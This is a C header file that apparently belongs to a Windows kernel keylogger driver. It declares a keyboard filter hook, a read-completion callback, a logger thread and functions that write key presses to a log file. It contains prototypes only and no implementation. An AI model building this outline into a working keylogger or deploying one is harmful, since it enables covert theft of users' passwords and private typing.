#pragma once
#include "defs.h"

extern const char* KEY_MAP[84];

NTSTATUS OpenLogFile();

NTSTATUS CloseLogFile();

NTSTATUS WriteLogFile(bool is_pressed, char scancode);

NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOID Context);

NTSTATUS DispatchPassDown(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);

NTSTATUS DispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);

VOID DriverUnload(IN PDRIVER_OBJECT pDriverObject);

VOID ThreadKeyLogger(IN PVOID pContext);

NTSTATUS SetKeyboardHook(PDRIVER_OBJECT pDriverObject, PDEVICE_OBJECT pKeyboardFilterDeviceObject);

NTSTATUS RemoveKeyboardHook(PDRIVER_OBJECT pDriverObject);

NTSTATUS CreateLoggerThread(PDRIVER_OBJECT pDriverObject);

